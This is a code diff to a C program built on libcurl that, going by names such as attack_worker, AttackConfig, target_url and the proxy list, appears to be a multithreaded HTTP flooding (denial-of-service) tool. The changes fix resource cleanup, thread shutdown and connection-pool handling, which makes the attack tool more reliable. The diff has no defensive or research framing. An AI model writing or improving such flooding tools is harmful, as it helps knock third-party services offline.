@@ -66,6 +66,7 @@ ProxyList proxy_list = {0};
 AtomicCounter stats = {0, PTHREAD_MUTEX_INITIALIZER};
 AtomicCounter bytes_sent = {0, PTHREAD_MUTEX_INITIALIZER};
 volatile bool running = true;
+volatile bool cleaning_up = false;
 pthread_t workers[MAX_WORKERS];
 pthread_t stats_thread;
 time_t start_time;
@@ -313,13 +314,27 @@ void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const 
             curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYPEER, 0L);
             curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYHOST, 0L);
             curl_easy_setopt(pool->handles[i], CURLOPT_NOSIGNAL, 1L);
-            curl_easy_setopt(pool->handles[i], CURLOPT_FORBID_REUSE, 1L);
-            curl_easy_setopt(pool->handles[i], CURLOPT_TCP_NODELAY, 1L);
             curl_easy_setopt(pool->handles[i], CURLOPT_BUFFERSIZE, (long)(1024 * 1024));
         }
     }
     
     printf(COLOR_GREEN "[+] Connection pool ready!\n" COLOR_RESET);
+}
+
+void cleanup_connection_pool(ConnectionPool *pool) {
+    if (!pool) return;
+    
+    pthread_mutex_lock(&pool->mutex);
+    for (int i = 0; i < pool->size; i++) {
+        if (pool->handles[i]) {
+            curl_easy_cleanup(pool->handles[i]);
+            pool->handles[i] = NULL;
+        }
+    }
+    free(pool->handles);
+    pthread_mutex_unlock(&pool->mutex);
+    pthread_mutex_destroy(&pool->mutex);
+    free(pool);
 }
 
 CURL* pool_get_client(ConnectionPool *pool) {
@@ -335,8 +350,6 @@ CURL* pool_get_client(ConnectionPool *pool) {
     curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 0L);
     curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 0L);
     curl_easy_setopt(handle, CURLOPT_NOSIGNAL, 1L);
-    curl_easy_setopt(handle, CURLOPT_FORBID_REUSE, 1L);
-    curl_easy_setopt(handle, CURLOPT_TCP_NODELAY, 1L);
     
     return handle;
 }
@@ -430,14 +443,14 @@ void attack_worker(const char *target, const char *host, ConnectionPool *pool) {
     pthread_mutex_unlock(&bytes_sent.mutex);
     
     curl_slist_free_all(headers);
-    curl_easy_cleanup(curl);
+    // Don't cleanup curl handle - it belongs to the pool
     free(path);
 }
 
 void* worker_thread(void *arg) {
     AttackConfig *cfg = (AttackConfig*)arg;
     
-    while (running) {
+    while (running && !cleaning_up) {
         attack_worker(cfg->target_url, cfg->target_host, cfg->pool);
     }
     
@@ -601,6 +614,13 @@ int main(int argc, char *argv[]) {
     sleep(cfg.duration_sec);
     running = false;
     
+    // Give workers time to finish current requests
+    printf(COLOR_YELLOW "\n[!] Waiting for workers to finish...\n" COLOR_RESET);
+    usleep(500000); // 0.5 seconds
+    
+    cleaning_up = true;
+    
+    // Join all worker threads
     for (int i = 0; i < MAX_WORKERS; i++) {
         pthread_join(workers[i], NULL);
     }
@@ -625,20 +645,21 @@ int main(int argc, char *argv[]) {
     printf(COLOR_RED "    ╚════════════════════════════════════════════════════════════╝\n");
     printf(COLOR_RESET);
     
-    for (int i = 0; i < POOL_SIZE; i++) {
-        if (connection_pool->handles[i]) {
-            curl_easy_cleanup(connection_pool->handles[i]);
-        }
-    }
-    free(connection_pool->handles);
-    free(connection_pool);
+    // Clean up in correct order
+    cleanup_connection_pool(connection_pool);
     
     if (proxy_list.proxies) {
+        pthread_mutex_lock(&proxy_list.mutex);
         for (int i = 0; i < proxy_list.count; i++) {
             if (proxy_list.proxies[i]) free(proxy_list.proxies[i]);
         }
         free(proxy_list.proxies);
+        pthread_mutex_unlock(&proxy_list.mutex);
     }
+    
+    pthread_mutex_destroy(&stats.mutex);
+    pthread_mutex_destroy(&bytes_sent.mutex);
+    pthread_mutex_destroy(&proxy_list.mutex);
     
     free(args_array);
     curl_global_cleanup();
